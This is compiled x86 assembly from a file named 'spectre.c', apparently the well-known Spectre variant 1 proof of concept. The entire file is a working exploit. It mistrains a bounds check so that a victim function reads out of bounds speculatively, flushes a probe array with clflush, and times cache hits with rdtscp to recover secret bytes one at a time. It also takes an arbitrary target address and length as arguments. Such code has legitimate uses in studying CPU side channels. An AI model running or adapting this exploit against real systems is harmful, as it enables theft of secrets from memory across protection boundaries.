	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	eax
	call	.L0$pb
.L0$pb:
	pop	ecx
.Ltmp0:
	add	ecx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	eax, dword ptr [ebp + 8]
	mov	eax, dword ptr [ebp + 8]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cmp	eax, ecx
	jae	.LBB0_2
# %bb.1:
	mov	dword ptr [ebp - 4], 1
	jmp	.LBB0_3
.LBB0_2:
	mov	dword ptr [ebp - 4], 0
.LBB0_3:
	mov	eax, dword ptr [ebp - 4]
	add	esp, 4
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leak_data                       # -- Begin function leak_data
	.p2align	4, 0x90
	.type	leak_data,@function
leak_data:                              # @leak_data
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	eax
	call	.L1$pb
.L1$pb:
	pop	ecx
.Ltmp1:
	add	ecx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	dword ptr [ebp - 4], ecx        # 4-byte Spill
	mov	eax, dword ptr [ebp + 8]
	mov	eax, dword ptr [ebp + 8]
	mov	eax, dword ptr [eax]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cmp	eax, ecx
	jae	.LBB1_2
# %bb.1:
	mov	eax, dword ptr [ebp - 4]        # 4-byte Reload
	mov	ecx, dword ptr [ebp + 8]
	mov	ecx, dword ptr [ecx]
	movzx	ecx, byte ptr [eax + ecx + array1@GOTOFF]
	shl	ecx, 9
	movzx	edx, byte ptr [eax + ecx + array2@GOTOFF]
	movzx	ecx, byte ptr [eax + temp@GOTOFF]
	and	ecx, edx
                                        # kill: def $cl killed $cl killed $ecx
	mov	byte ptr [eax + temp@GOTOFF], cl
.LBB1_2:
	add	esp, 4
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end1:
	.size	leak_data, .Lfunc_end1-leak_data
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	ebx
	push	eax
	.cfi_offset ebx, -12
	call	.L2$pb
.L2$pb:
	pop	ebx
.Ltmp2:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	mov	eax, dword ptr [ebp + 8]
	lea	eax, [ebp + 8]
	mov	dword ptr [esp], eax
	call	leak_data
	add	esp, 4
	pop	ebx
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	ebx
	push	edi
	push	esi
	sub	esp, 92
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	call	.L3$pb
.L3$pb:
	pop	eax
.Ltmp3:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	mov	dword ptr [ebp - 84], eax       # 4-byte Spill
	mov	eax, dword ptr [ebp + 16]
	mov	eax, dword ptr [ebp + 12]
	mov	eax, dword ptr [ebp + 8]
	mov	dword ptr [ebp - 44], 0
	mov	dword ptr [ebp - 28], 0
.LBB3_1:                                # =>This Inner Loop Header: Depth=1
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB3_4
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	mov	dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF], 0
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB3_1
.LBB3_4:
	mov	dword ptr [ebp - 24], 999
.LBB3_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_11 Depth 2
                                        #       Child Loop BB3_13 Depth 3
                                        #     Child Loop BB3_19 Depth 2
                                        #     Child Loop BB3_26 Depth 2
	cmp	dword ptr [ebp - 24], 0
	jle	.LBB3_42
# %bb.6:                                #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [ebp - 28], 0
.LBB3_7:                                #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	shl	ecx, 9
	lea	eax, [eax + array2@GOTOFF]
	add	eax, ecx
	clflush	byte ptr [eax]
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB3_7
.LBB3_10:                               #   in Loop: Header=BB3_5 Depth=1
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 24]
	mov	ecx, dword ptr [ecx + array1_size@GOTOFF]
	cdq
	idiv	ecx
	mov	dword ptr [ebp - 48], edx
	mov	dword ptr [ebp - 32], 29
.LBB3_11:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_13 Depth 3
	cmp	dword ptr [ebp - 32], 0
	jl	.LBB3_18
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	clflush	byte ptr [eax + array1_size@GOTOFF]
	mov	dword ptr [ebp - 80], 0
.LBB3_13:                               #   Parent Loop BB3_5 Depth=1
                                        #     Parent Loop BB3_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	mov	eax, dword ptr [ebp - 80]
	cmp	eax, 100
	jge	.LBB3_16
# %bb.14:                               #   in Loop: Header=BB3_13 Depth=3
	jmp	.LBB3_15
.LBB3_15:                               #   in Loop: Header=BB3_13 Depth=3
	mov	eax, dword ptr [ebp - 80]
	add	eax, 1
	mov	dword ptr [ebp - 80], eax
	jmp	.LBB3_13
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=2
	mov	ebx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 32]
	mov	ecx, 6
	cdq
	idiv	ecx
	mov	eax, edx
	sub	eax, 1
	and	eax, -65536
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 52]
	mov	ecx, dword ptr [ebp - 52]
	shr	ecx, 16
	or	eax, ecx
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 48]
	mov	ecx, dword ptr [ebp - 52]
	mov	edx, dword ptr [ebp + 8]
	xor	edx, dword ptr [ebp - 48]
	and	ecx, edx
	xor	eax, ecx
	mov	dword ptr [ebp - 52], eax
	mov	eax, dword ptr [ebp - 52]
	mov	dword ptr [esp], eax
	call	victim_function
# %bb.17:                               #   in Loop: Header=BB3_11 Depth=2
	mov	eax, dword ptr [ebp - 32]
	add	eax, -1
	mov	dword ptr [ebp - 32], eax
	jmp	.LBB3_11
.LBB3_18:                               #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [ebp - 28], 0
.LBB3_19:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB3_25
# %bb.20:                               #   in Loop: Header=BB3_19 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 28]
	imul	ecx, ecx, 167
	add	ecx, 13
                                        # kill: def $cl killed $cl killed $ecx
	movzx	ecx, cl
	mov	dword ptr [ebp - 40], ecx
	mov	ecx, dword ptr [ebp - 40]
	shl	ecx, 9
	lea	eax, [eax + ecx + array2@GOTOFF]
	mov	dword ptr [ebp - 76], eax
	lea	eax, [ebp - 44]
	mov	dword ptr [ebp - 96], eax       # 4-byte Spill
	mov	dword ptr [ebp - 16], eax
	mov	esi, dword ptr [ebp - 16]
	rdtscp
	mov	edi, eax
	mov	eax, dword ptr [ebp - 96]       # 4-byte Reload
	mov	dword ptr [ebp - 92], edi       # 4-byte Spill
	mov	edi, ecx
	mov	ecx, dword ptr [ebp - 92]       # 4-byte Reload
	mov	dword ptr [esi], edi
	mov	dword ptr [ebp - 60], edx
	mov	dword ptr [ebp - 64], ecx
	mov	ecx, dword ptr [ebp - 76]
	movzx	ecx, byte ptr [ecx]
	mov	dword ptr [ebp - 44], ecx
	mov	dword ptr [ebp - 20], eax
	mov	eax, dword ptr [ebp - 20]
	mov	dword ptr [ebp - 88], eax       # 4-byte Spill
	rdtscp
	mov	esi, ecx
	mov	ecx, dword ptr [ebp - 88]       # 4-byte Reload
	mov	dword ptr [ecx], esi
	mov	esi, dword ptr [ebp - 64]
	mov	ecx, dword ptr [ebp - 60]
	sub	eax, esi
	sbb	edx, ecx
	mov	dword ptr [ebp - 72], eax
	mov	dword ptr [ebp - 68], edx
	mov	esi, dword ptr [ebp - 72]
	mov	ecx, dword ptr [ebp - 68]
	xor	eax, eax
	mov	edx, 100
	sub	edx, esi
	sbb	eax, ecx
	jb	.LBB3_23
	jmp	.LBB3_21
.LBB3_21:                               #   in Loop: Header=BB3_19 Depth=2
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 40]
	mov	dword ptr [ebp - 100], eax      # 4-byte Spill
	mov	eax, dword ptr [ebp - 24]
	mov	esi, dword ptr [ecx + array1_size@GOTOFF]
	cdq
	idiv	esi
	mov	eax, dword ptr [ebp - 100]      # 4-byte Reload
	movzx	ecx, byte ptr [ecx + edx + array1@GOTOFF]
	cmp	eax, ecx
	je	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_19 Depth=2
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 40]
	mov	edx, dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF]
	add	edx, 1
	mov	dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF], edx
.LBB3_23:                               #   in Loop: Header=BB3_19 Depth=2
	jmp	.LBB3_24
.LBB3_24:                               #   in Loop: Header=BB3_19 Depth=2
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB3_19
.LBB3_25:                               #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [ebp - 36], -1
	mov	dword ptr [ebp - 32], -1
	mov	dword ptr [ebp - 28], 0
.LBB3_26:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 28], 256
	jge	.LBB3_36
# %bb.27:                               #   in Loop: Header=BB3_26 Depth=2
	cmp	dword ptr [ebp - 32], 0
	jl	.LBB3_29
# %bb.28:                               #   in Loop: Header=BB3_26 Depth=2
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 28]
	mov	eax, dword ptr [ecx + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [ebp - 32]
	cmp	eax, dword ptr [ecx + 4*edx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_30
.LBB3_29:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [ebp - 32]
	mov	dword ptr [ebp - 36], eax
	mov	eax, dword ptr [ebp - 28]
	mov	dword ptr [ebp - 32], eax
	jmp	.LBB3_34
.LBB3_30:                               #   in Loop: Header=BB3_26 Depth=2
	cmp	dword ptr [ebp - 36], 0
	jl	.LBB3_32
# %bb.31:                               #   in Loop: Header=BB3_26 Depth=2
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 28]
	mov	eax, dword ptr [ecx + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [ebp - 36]
	cmp	eax, dword ptr [ecx + 4*edx + readMemoryByte.results@GOTOFF]
	jl	.LBB3_33
.LBB3_32:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [ebp - 28]
	mov	dword ptr [ebp - 36], eax
.LBB3_33:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_34
.LBB3_34:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_35
.LBB3_35:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [ebp - 28]
	add	eax, 1
	mov	dword ptr [ebp - 28], eax
	jmp	.LBB3_26
.LBB3_36:                               #   in Loop: Header=BB3_5 Depth=1
	mov	ecx, dword ptr [ebp - 84]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 32]
	mov	eax, dword ptr [ecx + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [ebp - 36]
	mov	ecx, dword ptr [ecx + 4*edx + readMemoryByte.results@GOTOFF]
	shl	ecx, 1
	add	ecx, 5
	cmp	eax, ecx
	jge	.LBB3_39
# %bb.37:                               #   in Loop: Header=BB3_5 Depth=1
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 32]
	cmp	dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF], 2
	jne	.LBB3_40
# %bb.38:                               #   in Loop: Header=BB3_5 Depth=1
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 36]
	cmp	dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF], 0
	jne	.LBB3_40
.LBB3_39:
	jmp	.LBB3_42
.LBB3_40:                               #   in Loop: Header=BB3_5 Depth=1
	jmp	.LBB3_41
.LBB3_41:                               #   in Loop: Header=BB3_5 Depth=1
	mov	eax, dword ptr [ebp - 24]
	add	eax, -1
	mov	dword ptr [ebp - 24], eax
	jmp	.LBB3_5
.LBB3_42:
	mov	eax, dword ptr [ebp - 84]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 44]
	xor	ecx, dword ptr [eax + readMemoryByte.results@GOTOFF]
	mov	dword ptr [eax + readMemoryByte.results@GOTOFF], ecx
	mov	ecx, dword ptr [ebp - 32]
	mov	dl, cl
	mov	ecx, dword ptr [ebp + 12]
	mov	byte ptr [ecx], dl
	mov	ecx, dword ptr [ebp - 32]
	mov	edx, dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	ecx, dword ptr [ebp + 16]
	mov	dword ptr [ecx], edx
	mov	ecx, dword ptr [ebp - 36]
	mov	dl, cl
	mov	ecx, dword ptr [ebp + 12]
	mov	byte ptr [ecx + 1], dl
	mov	ecx, dword ptr [ebp - 36]
	mov	ecx, dword ptr [eax + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	eax, dword ptr [ebp + 16]
	mov	dword ptr [eax + 4], ecx
	add	esp, 92
	pop	esi
	pop	edi
	pop	ebx
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset ebp, -8
	mov	ebp, esp
	.cfi_def_cfa_register ebp
	push	ebx
	push	esi
	sub	esp, 80
	.cfi_offset esi, -16
	.cfi_offset ebx, -12
	call	.L4$pb
.L4$pb:
	pop	eax
.Ltmp4:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp4-.L4$pb)
	mov	dword ptr [ebp - 48], eax       # 4-byte Spill
	mov	eax, dword ptr [ebp + 12]
	mov	eax, dword ptr [ebp + 8]
	mov	dword ptr [ebp - 12], 0
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_3 Depth 2
                                        #     Child Loop BB4_9 Depth 2
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	call	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	mov	byte ptr [ebp - 13], al
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 114
	jne	.LBB4_22
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	ecx, dword ptr [ebx + secret@GOTOFF]
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	lea	edx, [ebx + .L.str.1@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	lea	ecx, [ebx + array1@GOTOFF]
	sub	eax, ecx
	mov	dword ptr [ebp - 20], eax
	mov	ecx, dword ptr [ebx + secret@GOTOFF]
	mov	eax, esp
	mov	dword ptr [eax], ecx
	call	strlen@PLT
	mov	dword ptr [ebp - 32], eax
	mov	dword ptr [ebp - 40], 0
.LBB4_3:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [ebp - 40], 131072
	jae	.LBB4_6
# %bb.4:                                #   in Loop: Header=BB4_3 Depth=2
	mov	eax, dword ptr [ebp - 48]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 40]
	mov	byte ptr [eax + ecx + array2@GOTOFF], 1
# %bb.5:                                #   in Loop: Header=BB4_3 Depth=2
	mov	eax, dword ptr [ebp - 40]
	add	eax, 1
	mov	dword ptr [ebp - 40], eax
	jmp	.LBB4_3
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	dword ptr [ebp + 8], 3
	jne	.LBB4_8
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	eax, dword ptr [ebp + 12]
	mov	edx, dword ptr [eax + 4]
	lea	eax, [ebp - 20]
	lea	ecx, [ebx + .L.str.2@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	__isoc99_sscanf@PLT
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 20]
	lea	ecx, [ebx + array1@GOTOFF]
	sub	eax, ecx
	mov	dword ptr [ebp - 20], eax
	mov	eax, dword ptr [ebp + 12]
	mov	edx, dword ptr [eax + 8]
	lea	ecx, [ebx + .L.str.3@GOTOFF]
	lea	eax, [ebp - 32]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	__isoc99_sscanf@PLT
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 20]
	mov	eax, dword ptr [ebp - 32]
	lea	edx, [ebx + .L.str.4@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
.LBB4_8:                                #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 32]
	lea	ecx, [ebx + .L.str.5@GOTOFF]
	mov	dword ptr [esp], ecx
	mov	dword ptr [esp + 4], eax
	call	printf@PLT
	mov	dword ptr [ebp - 44], 0
.LBB4_9:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, dword ptr [ebp - 32]
	add	eax, -1
	mov	dword ptr [ebp - 32], eax
	cmp	eax, 0
	jl	.LBB4_21
# %bb.10:                               #   in Loop: Header=BB4_9 Depth=2
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 20]
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	edx, dword ptr [ebp - 44]
	movsx	eax, byte ptr [eax + edx]
	lea	edx, [ebx + .L.str.6@GOTOFF]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	printf@PLT
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 44]
	add	eax, 1
	mov	dword ptr [ebp - 44], eax
	mov	edx, dword ptr [ebp - 20]
	mov	eax, edx
	add	eax, 1
	mov	dword ptr [ebp - 20], eax
	lea	ecx, [ebp - 34]
	lea	eax, [ebp - 28]
	mov	dword ptr [esp], edx
	mov	dword ptr [esp + 4], ecx
	mov	dword ptr [esp + 8], eax
	call	readMemoryByte
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	edx, dword ptr [ebp - 28]
	mov	esi, dword ptr [ebp - 24]
	shl	esi, 1
	lea	eax, [ebx + .L.str.9@GOTOFF]
	lea	ecx, [ebx + .L.str.8@GOTOFF]
	cmp	edx, esi
	cmovge	eax, ecx
	lea	ecx, [ebx + .L.str.7@GOTOFF]
	mov	dword ptr [esp], ecx
	mov	dword ptr [esp + 4], eax
	call	printf@PLT
	movzx	eax, byte ptr [ebp - 34]
	mov	dword ptr [ebp - 52], eax       # 4-byte Spill
	movzx	eax, byte ptr [ebp - 34]
	cmp	eax, 31
	jle	.LBB4_13
# %bb.11:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [ebp - 34]
	cmp	eax, 127
	jge	.LBB4_13
# %bb.12:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [ebp - 34]
	mov	dword ptr [ebp - 56], eax       # 4-byte Spill
	jmp	.LBB4_14
.LBB4_13:                               #   in Loop: Header=BB4_9 Depth=2
	mov	eax, 63
	mov	dword ptr [ebp - 56], eax       # 4-byte Spill
	jmp	.LBB4_14
.LBB4_14:                               #   in Loop: Header=BB4_9 Depth=2
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	edx, dword ptr [ebp - 52]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 56]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 28]
	lea	esi, [ebx + .L.str.10@GOTOFF]
	mov	dword ptr [esp], esi
	mov	dword ptr [esp + 4], edx
	mov	dword ptr [esp + 8], ecx
	mov	dword ptr [esp + 12], eax
	call	printf@PLT
	cmp	dword ptr [ebp - 24], 0
	jle	.LBB4_20
# %bb.15:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [ebp - 33]
	mov	dword ptr [ebp - 60], eax       # 4-byte Spill
	movzx	eax, byte ptr [ebp - 33]
	cmp	eax, 31
	jle	.LBB4_18
# %bb.16:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [ebp - 33]
	cmp	eax, 127
	jge	.LBB4_18
# %bb.17:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [ebp - 33]
	mov	dword ptr [ebp - 64], eax       # 4-byte Spill
	jmp	.LBB4_19
.LBB4_18:                               #   in Loop: Header=BB4_9 Depth=2
	mov	eax, 63
	mov	dword ptr [ebp - 64], eax       # 4-byte Spill
	jmp	.LBB4_19
.LBB4_19:                               #   in Loop: Header=BB4_9 Depth=2
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	edx, dword ptr [ebp - 60]       # 4-byte Reload
	mov	ecx, dword ptr [ebp - 64]       # 4-byte Reload
	mov	eax, dword ptr [ebp - 24]
	lea	esi, [ebx + .L.str.11@GOTOFF]
	mov	dword ptr [esp], esi
	mov	dword ptr [esp + 4], edx
	mov	dword ptr [esp + 8], ecx
	mov	dword ptr [esp + 12], eax
	call	printf@PLT
.LBB4_20:                               #   in Loop: Header=BB4_9 Depth=2
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	lea	eax, [ebx + .L.str.12@GOTOFF]
	mov	dword ptr [esp], eax
	call	printf@PLT
	jmp	.LBB4_9
.LBB4_21:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_22:                               #   in Loop: Header=BB4_1 Depth=1
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 10
	jne	.LBB4_24
# %bb.23:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_24:                               #   in Loop: Header=BB4_1 Depth=1
	movsx	eax, byte ptr [ebp - 13]
	cmp	eax, 105
	jne	.LBB4_26
# %bb.25:                               #   in Loop: Header=BB4_1 Depth=1
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	call	getpid@PLT
	mov	ebx, dword ptr [ebp - 48]       # 4-byte Reload
	mov	ecx, eax
	lea	eax, [ebx + .L.str.13@GOTOFF]
	mov	eax, esp
	mov	dword ptr [eax + 12], ecx
	lea	ecx, [ebx + check@GOTOFF]
	add	ecx, 33
	mov	dword ptr [eax + 4], ecx
	lea	ecx, [ebx + .L.str.13@GOTOFF]
	mov	dword ptr [eax], ecx
	setb	cl
	movzx	ecx, cl
	mov	dword ptr [eax + 8], ecx
	call	printf@PLT
	jmp	.LBB4_27
.LBB4_26:
	jmp	.LBB4_30
.LBB4_27:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_28
.LBB4_28:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_29:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_30:
	xor	eax, eax
	add	esp, 80
	pop	esi
	pop	ebx
	pop	ebp
	.cfi_def_cfa esp, 4
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.12,@object               # @.str.12
.L.str.12:
	.asciz	"\n"
	.size	.L.str.12, 2

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym leak_data
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
